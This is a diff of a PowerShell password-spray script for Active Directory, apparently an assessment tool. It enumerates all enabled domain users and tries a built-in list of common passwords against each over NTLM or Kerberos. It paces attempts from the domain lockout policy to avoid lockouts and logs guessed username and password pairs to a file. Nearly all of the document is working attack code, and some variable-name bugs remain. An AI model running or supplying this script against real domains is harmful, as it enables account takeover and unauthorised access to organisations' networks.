@@ -1,12 +1,60 @@
-﻿Param
+﻿<#
+.SYNOPSIS
+PowerShell based password spray.
+
+.DESCRIPTION
+This script performs a password spray atack against enabled users in a specific domain.
+
+.PARAMETER Domain (Required)
+Domain Name of your AD
+
+.PARAMETER AuthType (Required)
+Authentication type used for password spray.
+Either NTLM or Kerberos
+
+.PARAMETER AutoTune
+Option when selected builds in delays to avoid locking out user accounts
+
+.PARAMETER DomainController
+Provides the name of a target domain controller 
+
+.PARAMETER OnlyShowSuccess
+Option when selected only provides output when the correct password is guessed.
+
+.PARAMETER PasswordFile
+Option to provide a list of passwords (one per line)
+
+.PARAMETER PasswordSprayResultsFile
+Option to specify a comma delimited output file for correctly guessed username & password 
+
+
+
+.EXAMPLE
+PS>.\Invoke-PasswordSpray.ps1 -Domain 'trd.com' -AuthType Kerberos
+
+.NOTES
+AUTHOR: Sean Metcalf
+AUTHOR EMAIL: sean.metcalf@trustedsec.com
+COPYRIGHT: 2025 
+WEBSITE: https://ADSecurity.org
+
+This script requires the following:
+ * PowerShell 5.0 (minimum)
+ * Windows 10/2016
+ * Active Directory PowerShell Module
+If the above requirements are not met, results will be inconsistent.
+This script is provided as-is, without support.
+#>
+
+Param
  (
-    $Domain,
-    $AuthType = 'NTLM',
-    [switch]$OnlyShowSuccess = $True,
-    [switch]$AutoTune,
+    [Parameter(Mandatory=$true)]$Domain,
+    [Parameter(Mandatory=$true)][ValidateSet("NTLM", "Kerberos")]$AuthType, #Kerberos is way faster!
+    [switch]$AutoTune = $True,
     [string]$DomainController,
-    $PasswordFile,
-    $PasswordSprayResultsFile
+    [switch]$OnlyShowSuccess,
+    [string]$PasswordFile,
+    [string]$PasswordSprayResultsFile
  )
 
 IF ($DomainController)
@@ -18,8 +66,8 @@ ELSE
  {
     $DomainDCInfo = Get-ADDomainController -Discover -DomainName $Domain
     $DomainDC = $DomainDCInfo.Name
-    $DomainDCIP = $DomainDCInfo.IPv4Address
-    $RemotePath = "\\$DomainInfoDNS\SYSVOL"
+    [array]$DomainInfo = Get-ADDomain -Server $DomainDC
+    $RemotePath = "\\$($DomainInfo.DNSRoot)\SYSVOL"
  }
 
  [array]$DomainInfo = Get-ADDomain -Server $DomainDC
@@ -31,31 +79,36 @@ IF ($AutoTune -eq $True)
      Write-Host "Lockout Threshold is $($DomainPasswordPolicy.LockoutThreshold) with an Observation window of $($DomainPasswordPolicy.LockoutObservationWindow.TotalMinutes) minutes"
     IF ($DomainPasswordPolicy.LockoutThreshold -gt 0)
      {       
-        $TotalAttempts = ($DomainPasswordPolicy.LockoutObservationWindow.TotalMinutes / $DomainPasswordPolicy.LockoutThreshold) - 1
-        $WaitTimeInMinutes = $DomainPasswordPolicy.LockoutObservationWindow.TotalMinutes / $TotalAttempts
+        $WaitTimeInMinutes = ($DomainPasswordPolicy.LockoutObservationWindow.TotalMinutes / $DomainPasswordPolicy.LockoutThreshold) + 1
      }
     ELSE
      { $WaitTimeInMinutes = 1 }
  }
-
 
 IF (!$PasswordFile)                                                                                     
  { [array]$PasswordArray = @('Password99!','Password1234','P@ssw0rd1','1234Password','Password123!','Qwerty!','Zxcvbnm!','Qwertyuiop!','1234asdf!','qwer1234!','ThisIsASecurePassword!','WilECoyote!','WrongPassword!' ) }
 IF ($PasswordFile)
  { [array]$PasswordArray = Import-CSV $PasswordFile }
 
-[array]$UserAccountArray = Get-ADUser -Filter * -Server $DomainDC | Where { $_.Enabled -eq $True} 
+[array]$UserAccountArray = Get-ADUser -Filter 'Enabled  -eq $True' -Server $DomainDC 
 $UserAccountArray = $UserAccountArray | Sort-Object SamAccountName
 
-$PWSprayUserFileCheck = Read-Host "Password Spray Output file exists ($PasswordSprayResultsFile). Overwrite? (Y/N)?"
-IF ( ($PWSprayUserFileCheck -eq 'N') -OR ($PWSprayUserFileCheck -eq 'No') )
+IF ($PasswordFile)
  {
-    $PWSprayFileArray = $PasswordSprayResultsFile -Split '\\'
-    $PWSprayFileNameArrayCount = $PWSprayFileArray.count -1
-    $PWSprayFileNameArrayText = ($PWSprayFileArray[$PWSprayFileNameArrayCount] -split '\.')[0]
-    $PWSprayFileNameText = $PWSprayFileNameArrayText + '-' + $(Get-Random -min 100 -max 999)
-    $PWSprayFileNewArrayUpdated = $PasswordSprayResultsFile.Replace($PWSprayFileNameArrayText, $PWSprayFileNameText)
-    $PasswordSprayResultsFile = $PWSprayFileNewArrayUpdated
+    $PasswordFilePathCheck = Test-Path $PasswordFile
+    IF ($PasswordFilePathCheck -eq $True)
+     {
+        $PWSprayUserFileCheck = Read-Host "Password Spray Output file exists ($PasswordSprayResultsFile). Overwrite? (Y/N)?"
+        IF ( ($PWSprayUserFileCheck -eq 'N') -OR ($PWSprayUserFileCheck -eq 'No') )
+         {
+            $PWSprayFileArray = $PasswordSprayResultsFile -Split '\\'
+            $PWSprayFileNameArrayCount = $PWSprayFileArray.count -1
+            $PWSprayFileNameArrayText = ($PWSprayFileArray[$PWSprayFileNameArrayCount] -split '\.')[0]
+            $PWSprayFileNameText = $PWSprayFileNameArrayText + '-' + $(Get-Random -min 100 -max 999)
+            $PWSprayFileNewArrayUpdated = $PasswordSprayResultsFile.Replace($PWSprayFileNameArrayText, $PWSprayFileNameText)
+            $PasswordSprayResultsFile = $PWSprayFileNewArrayUpdated
+         }
+     }
  }
 
 "Password Spray Results for $Domain using $AuthType " | Out-File  $PassowrdSprayResultsFile
@@ -83,7 +136,7 @@ ForEach ($PasswordArrayItem in $PasswordArray)
                 IF ($outputSMB.Status -eq 'Ok')
                  { 
                     write-host "User $($UserAccountArrayItem.SamAccountName) has the password $PasswordArrayItem" -ForegroundColor Cyan
-                    $($UserAccountArrayItem.SamAccountName + ',' + $PasswordArrayItem | Out-File  $PasswordSprayResultsFile -Append   
+                    $($UserAccountArrayItem.SamAccountName) + ',' + $PasswordArrayItem | Out-File  $PasswordSprayResultsFile -Append   
                  }
              }
             CATCH
@@ -99,7 +152,7 @@ ForEach ($PasswordArrayItem in $PasswordArray)
                 IF ($outputDSDE.distinguishedName)
                  { 
                     write-host "User $($UserAccountArrayItem.SamAccountName) has the password $PasswordArrayItem" -ForegroundColor Cyan
-                    $($UserAccountArrayItem.SamAccountName + ',' + $PasswordArrayItem | Out-File  $PasswordSprayResultsFile -Append 
+                    $($UserAccountArrayItem.SamAccountName) + ',' + $PasswordArrayItem | Out-File  $PasswordSprayResultsFile -Append 
                  }
              }
             CATCH 
@@ -107,5 +160,8 @@ ForEach ($PasswordArrayItem in $PasswordArray)
           }
      }
     IF ($AutoTune -eq $True)
-     { Start-Sleep -Seconds $($WaitTimeInMinutes * 60) } 
+     { 
+        Write-Host "Pausing $WaitTimeInMinutes minutes..."
+        Start-Sleep -Seconds $($WaitTimeInMinutes * 60) 
+     } 
  }
